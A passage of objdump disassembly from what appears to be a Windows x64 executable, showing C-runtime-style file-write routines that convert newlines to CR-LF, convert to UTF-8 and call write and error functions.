   14000c596:	42 88 44 f1 3e       	mov    %al,0x3e(%rcx,%r14,8)
   14000c59b:	4b 8b 84 e0 d0 b7 01 	mov    0x1b7d0(%r8,%r12,8),%rax
   14000c5a2:	00 
   14000c5a3:	42 80 4c f0 3d 04    	orb    $0x4,0x3d(%rax,%r14,8)
   14000c5a9:	38 55 8f             	cmp    %dl,-0x71(%rbp)
   14000c5ac:	eb cc                	jmp    0x14000c57a
   14000c5ae:	ff 15 1c 2b 00 00    	call   *0x2b1c(%rip)        # 0x14000f0d0
   14000c5b4:	89 45 97             	mov    %eax,-0x69(%rbp)
   14000c5b7:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000c5bb:	80 7d 8f 00          	cmpb   $0x0,-0x71(%rbp)
   14000c5bf:	eb 08                	jmp    0x14000c5c9
   14000c5c1:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000c5c5:	44 38 5d 8f          	cmp    %r11b,-0x71(%rbp)
   14000c5c9:	74 0c                	je     0x14000c5d7
   14000c5cb:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000c5d0:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000c5d7:	48 8b 45 f7          	mov    -0x9(%rbp),%rax
   14000c5db:	f2 0f 10 45 97       	movsd  -0x69(%rbp),%xmm0
   14000c5e0:	f2 0f 11 00          	movsd  %xmm0,(%rax)
   14000c5e4:	89 48 08             	mov    %ecx,0x8(%rax)
   14000c5e7:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   14000c5eb:	48 33 cc             	xor    %rsp,%rcx
   14000c5ee:	e8 3d 6b ff ff       	call   0x140003130
   14000c5f3:	48 8b 9c 24 40 01 00 	mov    0x140(%rsp),%rbx
   14000c5fa:	00 
   14000c5fb:	48 81 c4 00 01 00 00 	add    $0x100,%rsp
   14000c602:	41 5f                	pop    %r15
   14000c604:	41 5e                	pop    %r14
   14000c606:	41 5d                	pop    %r13
   14000c608:	41 5c                	pop    %r12
   14000c60a:	5f                   	pop    %rdi
   14000c60b:	5e                   	pop    %rsi
   14000c60c:	5d                   	pop    %rbp
   14000c60d:	c3                   	ret
   14000c60e:	ff 15 bc 2a 00 00    	call   *0x2abc(%rip)        # 0x14000f0d0
   14000c614:	89 45 97             	mov    %eax,-0x69(%rbp)
   14000c617:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   14000c61b:	38 5d 8f             	cmp    %bl,-0x71(%rbp)
   14000c61e:	eb a9                	jmp    0x14000c5c9
   14000c620:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c625:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000c62a:	56                   	push   %rsi
   14000c62b:	57                   	push   %rdi
   14000c62c:	41 56                	push   %r14
   14000c62e:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000c633:	e8 a8 20 00 00       	call   0x14000e6e0
   14000c638:	48 2b e0             	sub    %rax,%rsp
   14000c63b:	48 8b 05 be d9 00 00 	mov    0xd9be(%rip),%rax        # 0x14001a000
   14000c642:	48 33 c4             	xor    %rsp,%rax
   14000c645:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000c64c:	00 
   14000c64d:	4c 63 d2             	movslq %edx,%r10
   14000c650:	48 8b f9             	mov    %rcx,%rdi
   14000c653:	49 8b c2             	mov    %r10,%rax
   14000c656:	41 8b e9             	mov    %r9d,%ebp
   14000c659:	48 c1 f8 06          	sar    $0x6,%rax
   14000c65d:	48 8d 0d 6c f1 00 00 	lea    0xf16c(%rip),%rcx        # 0x14001b7d0
   14000c664:	41 83 e2 3f          	and    $0x3f,%r10d
   14000c668:	49 03 e8             	add    %r8,%rbp
   14000c66b:	49 8b f0             	mov    %r8,%rsi
   14000c66e:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000c672:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000c676:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000c67b:	33 c0                	xor    %eax,%eax
   14000c67d:	48 89 07             	mov    %rax,(%rdi)
   14000c680:	89 47 08             	mov    %eax,0x8(%rdi)
   14000c683:	4c 3b c5             	cmp    %rbp,%r8
   14000c686:	73 6f                	jae    0x14000c6f7
   14000c688:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000c68d:	48 3b f5             	cmp    %rbp,%rsi
   14000c690:	73 24                	jae    0x14000c6b6
   14000c692:	8a 06                	mov    (%rsi),%al
   14000c694:	48 ff c6             	inc    %rsi
   14000c697:	3c 0a                	cmp    $0xa,%al
   14000c699:	75 09                	jne    0x14000c6a4
   14000c69b:	ff 47 08             	incl   0x8(%rdi)
   14000c69e:	c6 03 0d             	movb   $0xd,(%rbx)
   14000c6a1:	48 ff c3             	inc    %rbx
   14000c6a4:	88 03                	mov    %al,(%rbx)
   14000c6a6:	48 ff c3             	inc    %rbx
   14000c6a9:	48 8d 84 24 3f 14 00 	lea    0x143f(%rsp),%rax
   14000c6b0:	00 
   14000c6b1:	48 3b d8             	cmp    %rax,%rbx
   14000c6b4:	72 d7                	jb     0x14000c68d
   14000c6b6:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000c6bc:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000c6c1:	2b d8                	sub    %eax,%ebx
   14000c6c3:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000c6c8:	44 8b c3             	mov    %ebx,%r8d
   14000c6cb:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000c6d0:	49 8b ce             	mov    %r14,%rcx
   14000c6d3:	ff 15 57 2b 00 00    	call   *0x2b57(%rip)        # 0x14000f230
   14000c6d9:	85 c0                	test   %eax,%eax
   14000c6db:	74 12                	je     0x14000c6ef
   14000c6dd:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000c6e1:	01 47 04             	add    %eax,0x4(%rdi)
   14000c6e4:	3b c3                	cmp    %ebx,%eax
   14000c6e6:	72 0f                	jb     0x14000c6f7
   14000c6e8:	48 3b f5             	cmp    %rbp,%rsi
   14000c6eb:	72 9b                	jb     0x14000c688
   14000c6ed:	eb 08                	jmp    0x14000c6f7
   14000c6ef:	ff 15 db 29 00 00    	call   *0x29db(%rip)        # 0x14000f0d0
   14000c6f5:	89 07                	mov    %eax,(%rdi)
   14000c6f7:	48 8b c7             	mov    %rdi,%rax
   14000c6fa:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000c701:	00 
   14000c702:	48 33 cc             	xor    %rsp,%rcx
   14000c705:	e8 26 6a ff ff       	call   0x140003130
   14000c70a:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000c711:	00 
   14000c712:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000c716:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000c71a:	49 8b e3             	mov    %r11,%rsp
   14000c71d:	41 5e                	pop    %r14
   14000c71f:	5f                   	pop    %rdi
   14000c720:	5e                   	pop    %rsi
   14000c721:	c3                   	ret
   14000c722:	cc                   	int3
   14000c723:	cc                   	int3
   14000c724:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c729:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000c72e:	56                   	push   %rsi
   14000c72f:	57                   	push   %rdi
   14000c730:	41 56                	push   %r14
   14000c732:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000c737:	e8 a4 1f 00 00       	call   0x14000e6e0
   14000c73c:	48 2b e0             	sub    %rax,%rsp
   14000c73f:	48 8b 05 ba d8 00 00 	mov    0xd8ba(%rip),%rax        # 0x14001a000
   14000c746:	48 33 c4             	xor    %rsp,%rax
   14000c749:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000c750:	00 
   14000c751:	4c 63 d2             	movslq %edx,%r10
   14000c754:	48 8b f9             	mov    %rcx,%rdi
   14000c757:	49 8b c2             	mov    %r10,%rax
   14000c75a:	41 8b e9             	mov    %r9d,%ebp
   14000c75d:	48 c1 f8 06          	sar    $0x6,%rax
   14000c761:	48 8d 0d 68 f0 00 00 	lea    0xf068(%rip),%rcx        # 0x14001b7d0
   14000c768:	41 83 e2 3f          	and    $0x3f,%r10d
   14000c76c:	49 03 e8             	add    %r8,%rbp
   14000c76f:	49 8b f0             	mov    %r8,%rsi
   14000c772:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000c776:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000c77a:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000c77f:	33 c0                	xor    %eax,%eax
   14000c781:	48 89 07             	mov    %rax,(%rdi)
   14000c784:	89 47 08             	mov    %eax,0x8(%rdi)
   14000c787:	4c 3b c5             	cmp    %rbp,%r8
   14000c78a:	0f 83 82 00 00 00    	jae    0x14000c812
   14000c790:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000c795:	48 3b f5             	cmp    %rbp,%rsi
   14000c798:	73 31                	jae    0x14000c7cb
   14000c79a:	0f b7 06             	movzwl (%rsi),%eax
   14000c79d:	48 83 c6 02          	add    $0x2,%rsi
   14000c7a1:	66 83 f8 0a          	cmp    $0xa,%ax
   14000c7a5:	75 10                	jne    0x14000c7b7
   14000c7a7:	83 47 08 02          	addl   $0x2,0x8(%rdi)
   14000c7ab:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000c7b0:	66 89 0b             	mov    %cx,(%rbx)
   14000c7b3:	48 83 c3 02          	add    $0x2,%rbx
   14000c7b7:	66 89 03             	mov    %ax,(%rbx)
   14000c7ba:	48 83 c3 02          	add    $0x2,%rbx
   14000c7be:	48 8d 84 24 3e 14 00 	lea    0x143e(%rsp),%rax
   14000c7c5:	00 
   14000c7c6:	48 3b d8             	cmp    %rax,%rbx
   14000c7c9:	72 ca                	jb     0x14000c795
   14000c7cb:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000c7d1:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000c7d6:	48 2b d8             	sub    %rax,%rbx
   14000c7d9:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000c7de:	48 d1 fb             	sar    $1,%rbx
   14000c7e1:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000c7e6:	03 db                	add    %ebx,%ebx
   14000c7e8:	49 8b ce             	mov    %r14,%rcx
   14000c7eb:	44 8b c3             	mov    %ebx,%r8d
   14000c7ee:	ff 15 3c 2a 00 00    	call   *0x2a3c(%rip)        # 0x14000f230
   14000c7f4:	85 c0                	test   %eax,%eax
   14000c7f6:	74 12                	je     0x14000c80a
   14000c7f8:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000c7fc:	01 47 04             	add    %eax,0x4(%rdi)
   14000c7ff:	3b c3                	cmp    %ebx,%eax
   14000c801:	72 0f                	jb     0x14000c812
   14000c803:	48 3b f5             	cmp    %rbp,%rsi
   14000c806:	72 88                	jb     0x14000c790
   14000c808:	eb 08                	jmp    0x14000c812
   14000c80a:	ff 15 c0 28 00 00    	call   *0x28c0(%rip)        # 0x14000f0d0
   14000c810:	89 07                	mov    %eax,(%rdi)
   14000c812:	48 8b c7             	mov    %rdi,%rax
   14000c815:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000c81c:	00 
   14000c81d:	48 33 cc             	xor    %rsp,%rcx
   14000c820:	e8 0b 69 ff ff       	call   0x140003130
   14000c825:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000c82c:	00 
   14000c82d:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000c831:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000c835:	49 8b e3             	mov    %r11,%rsp
   14000c838:	41 5e                	pop    %r14
   14000c83a:	5f                   	pop    %rdi
   14000c83b:	5e                   	pop    %rsi
   14000c83c:	c3                   	ret
   14000c83d:	cc                   	int3
   14000c83e:	cc                   	int3
   14000c83f:	cc                   	int3
   14000c840:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c845:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000c84a:	56                   	push   %rsi
   14000c84b:	57                   	push   %rdi
   14000c84c:	41 54                	push   %r12
   14000c84e:	41 56                	push   %r14
   14000c850:	41 57                	push   %r15
   14000c852:	b8 70 14 00 00       	mov    $0x1470,%eax
   14000c857:	e8 84 1e 00 00       	call   0x14000e6e0
   14000c85c:	48 2b e0             	sub    %rax,%rsp
   14000c85f:	48 8b 05 9a d7 00 00 	mov    0xd79a(%rip),%rax        # 0x14001a000
   14000c866:	48 33 c4             	xor    %rsp,%rax
   14000c869:	48 89 84 24 60 14 00 	mov    %rax,0x1460(%rsp)
   14000c870:	00 
   14000c871:	4c 63 d2             	movslq %edx,%r10
   14000c874:	48 8b d9             	mov    %rcx,%rbx
   14000c877:	49 8b c2             	mov    %r10,%rax
   14000c87a:	45 8b f1             	mov    %r9d,%r14d
   14000c87d:	48 c1 f8 06          	sar    $0x6,%rax
   14000c881:	48 8d 0d 48 ef 00 00 	lea    0xef48(%rip),%rcx        # 0x14001b7d0
   14000c888:	41 83 e2 3f          	and    $0x3f,%r10d
   14000c88c:	4d 03 f0             	add    %r8,%r14
   14000c88f:	4d 8b f8             	mov    %r8,%r15
   14000c892:	49 8b f8             	mov    %r8,%rdi
   14000c895:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000c899:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000c89d:	4c 8b 64 d0 28       	mov    0x28(%rax,%rdx,8),%r12
   14000c8a2:	33 c0                	xor    %eax,%eax
   14000c8a4:	48 89 03             	mov    %rax,(%rbx)
   14000c8a7:	4d 3b c6             	cmp    %r14,%r8
   14000c8aa:	89 43 08             	mov    %eax,0x8(%rbx)
   14000c8ad:	0f 83 ce 00 00 00    	jae    0x14000c981
   14000c8b3:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000c8b8:	49 3b fe             	cmp    %r14,%rdi
   14000c8bb:	73 2d                	jae    0x14000c8ea
   14000c8bd:	0f b7 0f             	movzwl (%rdi),%ecx
   14000c8c0:	48 83 c7 02          	add    $0x2,%rdi
   14000c8c4:	66 83 f9 0a          	cmp    $0xa,%cx
   14000c8c8:	75 0c                	jne    0x14000c8d6
   14000c8ca:	ba 0d 00 00 00       	mov    $0xd,%edx
   14000c8cf:	66 89 10             	mov    %dx,(%rax)
   14000c8d2:	48 83 c0 02          	add    $0x2,%rax
   14000c8d6:	66 89 08             	mov    %cx,(%rax)
   14000c8d9:	48 83 c0 02          	add    $0x2,%rax
   14000c8dd:	48 8d 8c 24 f8 06 00 	lea    0x6f8(%rsp),%rcx
   14000c8e4:	00 
   14000c8e5:	48 3b c1             	cmp    %rcx,%rax
   14000c8e8:	72 ce                	jb     0x14000c8b8
   14000c8ea:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000c8f0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000c8f5:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000c8fb:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000c900:	48 2b c1             	sub    %rcx,%rax
   14000c903:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   14000c90a:	00 
   14000c90b:	48 8d 8c 24 00 07 00 	lea    0x700(%rsp),%rcx
   14000c912:	00 
   14000c913:	48 d1 f8             	sar    $1,%rax
   14000c916:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000c91b:	44 8b c8             	mov    %eax,%r9d
   14000c91e:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000c923:	33 d2                	xor    %edx,%edx
   14000c925:	e8 9e cd ff ff       	call   0x1400096c8
   14000c92a:	8b e8                	mov    %eax,%ebp
   14000c92c:	85 c0                	test   %eax,%eax
   14000c92e:	74 49                	je     0x14000c979
   14000c930:	33 f6                	xor    %esi,%esi
   14000c932:	85 c0                	test   %eax,%eax
   14000c934:	74 33                	je     0x14000c969
   14000c936:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000c93c:	48 8d 94 24 00 07 00 	lea    0x700(%rsp),%rdx
   14000c943:	00 
   14000c944:	8b ce                	mov    %esi,%ecx
   14000c946:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000c94b:	44 8b c5             	mov    %ebp,%r8d
   14000c94e:	48 03 d1             	add    %rcx,%rdx
   14000c951:	49 8b cc             	mov    %r12,%rcx
   14000c954:	44 2b c6             	sub    %esi,%r8d
   14000c957:	ff 15 d3 28 00 00    	call   *0x28d3(%rip)        # 0x14000f230
   14000c95d:	85 c0                	test   %eax,%eax
   14000c95f:	74 18                	je     0x14000c979
   14000c961:	03 74 24 40          	add    0x40(%rsp),%esi
   14000c965:	3b f5                	cmp    %ebp,%esi
   14000c967:	72 cd                	jb     0x14000c936
   14000c969:	8b c7                	mov    %edi,%eax
   14000c96b:	41 2b c7             	sub    %r15d,%eax
   14000c96e:	89 43 04             	mov    %eax,0x4(%rbx)
   14000c971:	49 3b fe             	cmp    %r14,%rdi
   14000c974:	e9 34 ff ff ff       	jmp    0x14000c8ad
   14000c979:	ff 15 51 27 00 00    	call   *0x2751(%rip)        # 0x14000f0d0
   14000c97f:	89 03                	mov    %eax,(%rbx)
   14000c981:	48 8b c3             	mov    %rbx,%rax
   14000c984:	48 8b 8c 24 60 14 00 	mov    0x1460(%rsp),%rcx
   14000c98b:	00 
   14000c98c:	48 33 cc             	xor    %rsp,%rcx
   14000c98f:	e8 9c 67 ff ff       	call   0x140003130
   14000c994:	4c 8d 9c 24 70 14 00 	lea    0x1470(%rsp),%r11
   14000c99b:	00 
   14000c99c:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000c9a0:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   14000c9a4:	49 8b e3             	mov    %r11,%rsp
   14000c9a7:	41 5f                	pop    %r15
   14000c9a9:	41 5e                	pop    %r14
   14000c9ab:	41 5c                	pop    %r12
   14000c9ad:	5f                   	pop    %rdi
   14000c9ae:	5e                   	pop    %rsi
   14000c9af:	c3                   	ret
   14000c9b0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000c9b5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000c9ba:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000c9be:	57                   	push   %rdi
   14000c9bf:	41 54                	push   %r12
   14000c9c1:	41 55                	push   %r13
   14000c9c3:	41 56                	push   %r14
   14000c9c5:	41 57                	push   %r15
   14000c9c7:	48 83 ec 20          	sub    $0x20,%rsp
   14000c9cb:	45 8b f0             	mov    %r8d,%r14d
   14000c9ce:	4c 8b fa             	mov    %rdx,%r15
   14000c9d1:	48 63 d9             	movslq %ecx,%rbx
   14000c9d4:	83 fb fe             	cmp    $0xfffffffe,%ebx
   14000c9d7:	75 18                	jne    0x14000c9f1
   14000c9d9:	e8 42 ad ff ff       	call   0x140007720
   14000c9de:	83 20 00             	andl   $0x0,(%rax)
   14000c9e1:	e8 5a ad ff ff       	call   0x140007740
   14000c9e6:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000c9ec:	e9 8f 00 00 00       	jmp    0x14000ca80
   14000c9f1:	85 c9                	test   %ecx,%ecx
   14000c9f3:	78 73                	js     0x14000ca68
   14000c9f5:	3b 1d d5 f1 00 00    	cmp    0xf1d5(%rip),%ebx        # 0x14001bbd0
   14000c9fb:	73 6b                	jae    0x14000ca68
   14000c9fd:	48 8b c3             	mov    %rbx,%rax
   14000ca00:	48 8b f3             	mov    %rbx,%rsi
   14000ca03:	48 c1 fe 06          	sar    $0x6,%rsi
   14000ca07:	4c 8d 2d c2 ed 00 00 	lea    0xedc2(%rip),%r13        # 0x14001b7d0
   14000ca0e:	83 e0 3f             	and    $0x3f,%eax
   14000ca11:	4c 8d 24 c0          	lea    (%rax,%rax,8),%r12
   14000ca15:	49 8b 44 f5 00       	mov    0x0(%r13,%rsi,8),%rax
   14000ca1a:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   14000ca20:	74 46                	je     0x14000ca68
   14000ca22:	8b cb                	mov    %ebx,%ecx
   14000ca24:	e8 2f d0 ff ff       	call   0x140009a58
   14000ca29:	83 cf ff             	or     $0xffffffff,%edi
   14000ca2c:	49 8b 44 f5 00       	mov    0x0(%r13,%rsi,8),%rax
   14000ca31:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   14000ca37:	75 15                	jne    0x14000ca4e
   14000ca39:	e8 02 ad ff ff       	call   0x140007740
   14000ca3e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000ca44:	e8 d7 ac ff ff       	call   0x140007720
   14000ca49:	83 20 00             	andl   $0x0,(%rax)
   14000ca4c:	eb 0f                	jmp    0x14000ca5d
   14000ca4e:	45 8b c6             	mov    %r14d,%r8d
   14000ca51:	49 8b d7             	mov    %r15,%rdx
   14000ca54:	8b cb                	mov    %ebx,%ecx
   14000ca56:	e8 41 00 00 00       	call   0x14000ca9c
   14000ca5b:	8b f8                	mov    %eax,%edi
   14000ca5d:	8b cb                	mov    %ebx,%ecx
   14000ca5f:	e8 1c d0 ff ff       	call   0x140009a80
   14000ca64:	8b c7                	mov    %edi,%eax
   14000ca66:	eb 1b                	jmp    0x14000ca83
   14000ca68:	e8 b3 ac ff ff       	call   0x140007720
   14000ca6d:	83 20 00             	andl   $0x0,(%rax)
   14000ca70:	e8 cb ac ff ff       	call   0x140007740
   14000ca75:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000ca7b:	e8 a0 ab ff ff       	call   0x140007620
   14000ca80:	83 c8 ff             	or     $0xffffffff,%eax
   14000ca83:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000ca88:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000ca8d:	48 83 c4 20          	add    $0x20,%rsp
   14000ca91:	41 5f                	pop    %r15
   14000ca93:	41 5e                	pop    %r14
   14000ca95:	41 5d                	pop    %r13
   14000ca97:	41 5c                	pop    %r12
   14000ca99:	5f                   	pop    %rdi
   14000ca9a:	c3                   	ret
   14000ca9b:	cc                   	int3
   14000ca9c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000caa1:	55                   	push   %rbp
   14000caa2:	56                   	push   %rsi
   14000caa3:	57                   	push   %rdi
   14000caa4:	41 54                	push   %r12
   14000caa6:	41 55                	push   %r13
   14000caa8:	41 56                	push   %r14
   14000caaa:	41 57                	push   %r15
   14000caac:	48 8b ec             	mov    %rsp,%rbp
   14000caaf:	48 83 ec 60          	sub    $0x60,%rsp
   14000cab3:	33 db                	xor    %ebx,%ebx
   14000cab5:	45 8b f0             	mov    %r8d,%r14d
   14000cab8:	4c 63 e1             	movslq %ecx,%r12
   14000cabb:	48 8b fa             	mov    %rdx,%rdi
   14000cabe:	45 85 c0             	test   %r8d,%r8d
   14000cac1:	0f 84 9e 02 00 00    	je     0x14000cd65
   14000cac7:	48 85 d2             	test   %rdx,%rdx
   14000caca:	75 1f                	jne    0x14000caeb
   14000cacc:	e8 4f ac ff ff       	call   0x140007720
   14000cad1:	89 18                	mov    %ebx,(%rax)
   14000cad3:	e8 68 ac ff ff       	call   0x140007740
   14000cad8:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000cade:	e8 3d ab ff ff       	call   0x140007620
   14000cae3:	83 c8 ff             	or     $0xffffffff,%eax
   14000cae6:	e9 7c 02 00 00       	jmp    0x14000cd67
   14000caeb:	49 8b c4             	mov    %r12,%rax
   14000caee:	48 8d 0d db ec 00 00 	lea    0xecdb(%rip),%rcx        # 0x14001b7d0
   14000caf5:	83 e0 3f             	and    $0x3f,%eax
   14000caf8:	4d 8b ec             	mov    %r12,%r13
   14000cafb:	49 c1 fd 06          	sar    $0x6,%r13
   14000caff:	4c 8d 3c c0          	lea    (%rax,%rax,8),%r15
   14000cb03:	4a 8b 0c e9          	mov    (%rcx,%r13,8),%rcx
   14000cb07:	42 0f be 74 f9 39    	movsbl 0x39(%rcx,%r15,8),%esi
   14000cb0d:	8d 46 ff             	lea    -0x1(%rsi),%eax
   14000cb10:	3c 01                	cmp    $0x1,%al
   14000cb12:	77 09                	ja     0x14000cb1d
   14000cb14:	41 8b c6             	mov    %r14d,%eax
   14000cb17:	f7 d0                	not    %eax
   14000cb19:	a8 01                	test   $0x1,%al
   14000cb1b:	74 af                	je     0x14000cacc
   14000cb1d:	42 f6 44 f9 38 20    	testb  $0x20,0x38(%rcx,%r15,8)
   14000cb23:	74 0e                	je     0x14000cb33
   14000cb25:	33 d2                	xor    %edx,%edx
   14000cb27:	41 8b cc             	mov    %r12d,%ecx
   14000cb2a:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   14000cb2e:	e8 55 06 00 00       	call   0x14000d188
   14000cb33:	41 8b cc             	mov    %r12d,%ecx
   14000cb36:	48 89 5d e0          	mov    %rbx,-0x20(%rbp)
   14000cb3a:	e8 35 03 00 00       	call   0x14000ce74
   14000cb3f:	85 c0                	test   %eax,%eax
   14000cb41:	0f 84 0b 01 00 00    	je     0x14000cc52
   14000cb47:	48 8d 05 82 ec 00 00 	lea    0xec82(%rip),%rax        # 0x14001b7d0
   14000cb4e:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   14000cb52:	42 38 5c f8 38       	cmp    %bl,0x38(%rax,%r15,8)
   14000cb57:	0f 8d f5 00 00 00    	jge    0x14000cc52
   14000cb5d:	e8 02 a6 ff ff       	call   0x140007164
   14000cb62:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   14000cb69:	48 39 99 38 01 00 00 	cmp    %rbx,0x138(%rcx)
   14000cb70:	75 16                	jne    0x14000cb88
   14000cb72:	48 8d 05 57 ec 00 00 	lea    0xec57(%rip),%rax        # 0x14001b7d0
   14000cb79:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   14000cb7d:	42 38 5c f8 39       	cmp    %bl,0x39(%rax,%r15,8)
   14000cb82:	0f 84 ca 00 00 00    	je     0x14000cc52
   14000cb88:	48 8d 05 41 ec 00 00 	lea    0xec41(%rip),%rax        # 0x14001b7d0
   14000cb8f:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   14000cb93:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   14000cb97:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   14000cb9c:	ff 15 ae 26 00 00    	call   *0x26ae(%rip)        # 0x14000f250
   14000cba2:	85 c0                	test   %eax,%eax
   14000cba4:	0f 84 a8 00 00 00    	je     0x14000cc52
   14000cbaa:	40 84 f6             	test   %sil,%sil
   14000cbad:	0f 84 81 00 00 00    	je     0x14000cc34
   14000cbb3:	40 fe ce             	dec    %sil
   14000cbb6:	40 80 fe 01          	cmp    $0x1,%sil
   14000cbba:	0f 87 2e 01 00 00    	ja     0x14000ccee
   14000cbc0:	4e 8d 24 37          	lea    (%rdi,%r14,1),%r12
   14000cbc4:	48 89 5d d0          	mov    %rbx,-0x30(%rbp)
   14000cbc8:	4c 8b f7             	mov    %rdi,%r14
   14000cbcb:	49 3b fc             	cmp    %r12,%rdi
   14000cbce:	0f 83 10 01 00 00    	jae    0x14000cce4
   14000cbd4:	8b 75 d4             	mov    -0x2c(%rbp),%esi
   14000cbd7:	41 0f b7 06          	movzwl (%r14),%eax
   14000cbdb:	0f b7 c8             	movzwl %ax,%ecx
   14000cbde:	66 89 45 f0          	mov    %ax,-0x10(%rbp)
   14000cbe2:	e8 a9 05 00 00       	call   0x14000d190
   14000cbe7:	0f b7 4d f0          	movzwl -0x10(%rbp),%ecx
   14000cbeb:	66 3b c1             	cmp    %cx,%ax
   14000cbee:	75 36                	jne    0x14000cc26
   14000cbf0:	83 c6 02             	add    $0x2,%esi
   14000cbf3:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   14000cbf6:	66 83 f9 0a          	cmp    $0xa,%cx
   14000cbfa:	75 1b                	jne    0x14000cc17
   14000cbfc:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000cc01:	e8 8a 05 00 00       	call   0x14000d190
   14000cc06:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000cc0b:	66 3b c1             	cmp    %cx,%ax
   14000cc0e:	75 16                	jne    0x14000cc26
   14000cc10:	ff c6                	inc    %esi
   14000cc12:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   14000cc15:	ff c3                	inc    %ebx
   14000cc17:	49 83 c6 02          	add    $0x2,%r14
   14000cc1b:	4d 3b f4             	cmp    %r12,%r14
   14000cc1e:	0f 83 c0 00 00 00    	jae    0x14000cce4
   14000cc24:	eb b1                	jmp    0x14000cbd7
   14000cc26:	ff 15 a4 24 00 00    	call   *0x24a4(%rip)        # 0x14000f0d0
   14000cc2c:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000cc2f:	e9 b0 00 00 00       	jmp    0x14000cce4
   14000cc34:	45 8b ce             	mov    %r14d,%r9d
   14000cc37:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000cc3b:	4c 8b c7             	mov    %rdi,%r8
   14000cc3e:	41 8b d4             	mov    %r12d,%edx
   14000cc41:	e8 ee f4 ff ff       	call   0x14000c134
   14000cc46:	f2 0f 10 00          	movsd  (%rax),%xmm0
   14000cc4a:	8b 58 08             	mov    0x8(%rax),%ebx
   14000cc4d:	e9 97 00 00 00       	jmp    0x14000cce9
